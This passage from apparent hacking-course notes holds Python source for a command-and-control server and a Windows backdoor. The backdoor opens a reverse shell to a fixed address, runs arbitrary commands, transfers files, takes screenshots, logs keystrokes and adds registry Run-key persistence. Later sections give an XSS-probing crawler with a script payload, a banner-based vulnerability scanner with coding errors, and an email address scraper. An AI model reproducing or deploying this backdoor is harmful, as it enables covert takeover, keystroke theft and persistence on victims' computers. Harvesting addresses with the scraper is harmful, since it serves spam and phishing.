            target, ip = sock.accept()
            targets.append(target)
            ips.append(ip)
            print(termcolor.colored(str(ip) + ' has connected!', 'green'))
        except:
            pass


targets = []
ips = []
stop_flag = False
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.1.9', 5555))
sock.listen(5)
t1 = threading.Thread(target=accept_connections)
t1.start()
print(termcolor.colored('[+] Waiting For The Incoming Connections ...', 'green'))

while True:
    command = input('[**] Command & Control Center: ')
    if command == 'targets':
        counter = 0
        for ip in ips:
            print('Session ' + str(counter) + ' --- ' + str(ip))
            counter += 1
    elif command == 'clear':
        os.system('clear')
    elif command[:7] == 'session':
        try:
            num = int(command[8:])
            tarnum = targets[num]
            tarip = ips[num]
            target_communication(tarnum, tarip)
        except:
            print('[-] No Session Under That ID Number')
    elif command == 'exit':
        for target in targets:
            reliable_send(target, 'quit')
            target.close()
        sock.close()
        stop_flag = True
        t1.join()
        break
    elif command[:4] == 'kill':
        targ = targets[int(command[5:])]
        ip = ips[int(command[5:])]
        reliable_send(targ, 'quit')
        targ.close()
        targets.remove(targ)
        ips.remove(ip)
    elif command[:7] == 'sendall':
        x = len(targets)
        print(x)
        i = 0
        try:
            while i < x:
                tarnumber = targets[i]
                print(tarnumber)
                reliable_send(tarnumber, command)
                i += 1
        except:
            print('Failed')
    else:
        print(termcolor.colored('[!!] Command Doesnt Exist', 'red'))
```

```
#!/usr/bin/env python

# backdoor.py

import socket
import json
import subprocess
import time
import os
import pyautogui
import keylogger
import threading
import shutil
import sys

def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()

def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())

def screenshot():
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save('screen.png')

def persist(reg_name, copy_name):
    file_location = os.environ['appdata'] + '\\' + copy_name
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"', shell=True)
            reliable_send('[+] Created Persistence With Reg Key: ' + reg_name)
        else:
            reliable_send('[+] Persistence Already Exists')
    except:
        reliable_send('[+] Error Creating Persistence With The Target Machine')

def connection():
    while True:
        time.sleep(20)
        try:
            s.connect(('192.168.1.4', 5555))
            shell()
            s.close()
            break
        except:
            connection()

def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'background':
            pass
        elif command == 'help':
            pass
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:10] == 'screenshot':
            screenshot()
            upload_file('screen.png')
            os.remove('screen.png')
        elif command[:12] == 'keylog_start':
            keylog = keylogger.Keylogger()
            t = threading.Thread(target=keylog.start)
            t.start()
            reliable_send('[+] Keylogger Started!')
        elif command[:11] == 'keylog_dump':
            logs = keylog.read_logs()
            reliable_send(logs)
        elif command[:11] == 'keylog_stop':
            keylog.self_destruct()
            t.join()
            reliable_send('[+] Keylogger Stopped!')
        elif command[:11] == 'persistence':
            reg_name, copy_name = command[12:].split(' ')
            persist(reg_name, copy_name)
        elif command[:7] == 'sendall':
            subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin = subprocess.PIPE)
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
```

```
#!/usr/bin/env python

# server.py

import socket
import termcolor
import json
import os

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())

def download_file(file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()


def target_communication():
    count = 0
    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(command)
        if command == 'quit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(command[7:])
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:10] == 'screenshot':
            f = open('screenshot%d' % (count), 'wb')
            target.settimeout(3)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            count += 1
        elif command == 'help':
            print(termcolor.colored('''\n
            quit                                --> Quit Session With The Target
            clear                               --> Clear The Screen
            cd *Directory Name*                 --> Changes Directory On Target System
            upload *file name*                  --> Upload File To The target Machine
            download *file name*                --> Download File From Target Machine
            keylog_start                        --> Start The Keylogger
            keylog_dump                         --> Print Keystrokes That The Target Inputted
            keylog_stop                         --> Stop And Self Destruct Keylogger File
            persistence *RegName* *fileName*    --> Create Persistence In Registry'''),'green')
        else:
            result = reliable_recv()
            print(result)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.1.4', 5555))
print(termcolor.colored('[+] Listening For The Incoming Connections', 'green'))
sock.listen(5)
target, ip = sock.accept()
print(termcolor.colored('[+] Target Connected From: ' + str(ip), 'green'))
target_communication()
```


---

## 16 - Vulnerability Scanner

- checks for vulnerabilities in the provided software

### Code

```
#!/usr/bin/env python

# vulnerability_scanner_1.py

import portscanner

targets_ip = input('[+] Enter Scan Target: ')
port_number = int(input('[+] Enter number of ports to scan: '))
vuln_file = input('[+] Enter path to file with vulnerable software: ')
print('\n')

target = portscanner.PortScan(targets_ip, port_number)
target.scan()

with open(vuln_file, 'r') as file:
	count = 0
	for banner in target.banners:
		file.seek(0)
		for line in file.readlines():
			if line.strip() in banner:
				print('[!!] VULNERABLE BANNER: "' + BANNER + '" ON PORT: ' + str(target.open_ports[count])
		count += 1
```

- `testphp.vulnweb.com`

- discovering vulnerability in web applications:
	1. Go into every page possible.
	2. Look for ways to send data to the application (URL + Forms).
	3. Send payloads to discover vulnerabilities.
	4. Analyze the response to check if website is vulnerable.

```
#!/usr/bin/env python

# extract_forms.py

import requests
from BeautifulSoup import BeautifulSoup
import urlparse

def request(url):
	try:
		return requests.get("http://" + url)
	except requests.exceptions.ConnectionError:
		pass
		
target_url = ""
response = request(target_url)

parsed_html = BeautifulSoup(response.content)
forms_list = parsed_html.findAll("form")

for form in forms_list:
	action = form.get("action")
	post_url = urlparse.urljoin(target_url, action)
	method = form.get("method")
	
	inputs_list = form.findAll("input")
	post_data = {}
	for input in inputs_list:
		input_name = input.get("name")
		input_type = input.get("type")
		input_value = input.get("value")
		if input_type == "text":
			input_value = "test"
			
		post_data[input_name] = input_value
	result = requests.post(post_url, data=post_data)
	print(result.content)
```

- **XSS** (*** Cross Site Scripting***)
	- allows an attacker to inject javascript code into the webpage
	- code is executed on the client machine when the page loads
	- types:
		1. Persistent/Stored
		2. Reflected
		3. DOM based
	- to discover XSS
		- try to inject JS code into the pages
		- test text boxes and url parameters on the form
	

```
#!/usr/bin/env python

# scanner.py

import requests

class Scanner:
	def __init__(self, url, ignore_links):
		self.target_url = url
		self.session = requests.session()
		self.target_links = []
		self.ignore_links = ignore_links
		
	def extract_links(self, url):
		response = self.session.get(url)
		return re.findall('(?:href=")(.*?)"', response.content)
		
	def crawl(self, url=None):
		if url == None:
			url = self.target_url
		href_links = self.extract_links(url)
		for link in href_links:
			link = urlparse.urljoin(url, link)
		
			if '#' in link:
				link = link.split('#')[0]
				
			if self.target_url in link and link not in self.target_links and link not in ignore_links:
				self.target_links.append(link)
				print(link)
				self.crawl(link)
				
	def extract_forms(self, url):
		response = self.session.get(url)
		parsed_html = BeautifulSoup(response.content)
		return parsed_html.findAll("form")
		
	def submit_form(self, form, value, url):
		action = form.get("action")
		post_url = urlparse.urljoin(url, action)
		method = form.get("method")
		
		inputs_list = form.findAll("input")
		post_data = {}
		for input in inputs_list:
			input_name = input.get("name")
			input_type = input.get("type")
			input_value = input.get("value")
			if input_type == "text":
				input_value = value
				
			post_data[input_name] = input_value
		if method == "post"
			return self.session.post(post_url, data=post_data)
		return self.session.get(post_url, params=post_data)
		
	def run_scanner(self):
		for link in self.target_links:
			forms = self.extract_forms(link)
			for form in forms:
				print("[+] Testing form in " + link)
				vulnerable_to_xss = self.test_xss_in_form(form, link)
				if vulnerable_to_xss:
					print("\n[***] XSS discovered in " + link + " in following form:")
					print(form)
				
			if "=" in link:
				print("\n\n[+] Testing " + link)
				vulnerable_to_xss = self.test_xss_in_link(link)
				if vulnerable_to_xss:
					print("\n[***] XSS discovered in " + link)
		
	def test_xss_in_link(self, url):
		xss_test_script = "<sCript>alert('test')</scriPt>"
		url = url.replace("=", "=" + xss_test_script)
		response = self.session.get(url)
		return xss_test_script in response.content
		
	def test_xss_in_form(self, form, url):
		xss_test_script = "<sCript>alert('test')</scriPt>"
		response = self.submit_form(form, xss_test_script, url)
		return xss_test_script in response.content
```

```
#!/usr/bin/env python

# vulnerability_scanner_2.py

import scanner

target_url = "http://10.0.2.20/dvwa"
ignore_links = ["http://10.0.2.20/dvwa/logout.php"]
data_dict = {"username": "admin", "password": "password", "Login": "submit"}

vuln_scanner = scanner.Scanner(target_url, ignore_links)
vuln_scanner.session.post(target_url + "/login.php", data=data_dict)

vuln_scanner.crawl()
vuln_scanner.run_scanner()
```

---

## 17 - Email Scraper

### Code

```
#!/usr/bin/env python

# email_scraper.py

from bs4 import BeautifulSoup
import requests
import requests.exceptions
import urllib.parse
from collections import deque
import re

target_url = str(input("[+] Enter Target URL to Scan: "))
urls = deque([target_url])

scraped_urls = set()
emails = set()

count = 0
try:
	while len(urls):
		count += 1
		
		if count == 100:
			break
			
		url = urls.popleft()
		scraped_urls.add(url)
		
		parts = urllib.parse.urlsplit(url)
		base_url = "{0.scheme}://{0.netloc}".format(parts)
		
		path = url[:url.rfind('/') + 1] if "/" in parts.path else url
		
		print("[%d] Processing %s" % (count, url))
		
		try:
			response = requests.get(url)
		except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
			continue
			
		new_emails = set(re.findall(r"[a-z0-9\.\-+_]+@[a-z0-9\.\-+_]+\.[a-z]+", response.text, re.I))
        emails.update(new_emails)

        soup = BeautifulSoup(response.text, features="lxml")

        for anchor in soup.find_all("a"):
            link = anchor.attrs['href'] if 'href' in anchor.attrs else ''
            if link.startswith('/'):
                link = base_url + link
            elif not link.startswith('http'):
                link = path + link
            if not link in urls and not link in scraped_urls:
                urls.append(link)
				
except KeyboardInterrupt:
    print('[-] Closing!')

for mail in emails:
    print(mail)
```

---

#additional-info

## Additional Information

- [Explain Shell](https://explainshell.com/)
- [Linux commands](https://www.mediacollege.com/linux/command/linux-command.html)
- [Metasploitable2](https://sourceforge.net/projects/metasploitable/files/Metasploitable2/)
- [Kali Linux](https://www.kali.org/downloads/)
- [Parrot Security](https://www.parrotsec.org/)
- [Berkeley Packet Filter (BPF) syntax](https://biot.com/capstats/bpf.html)

---
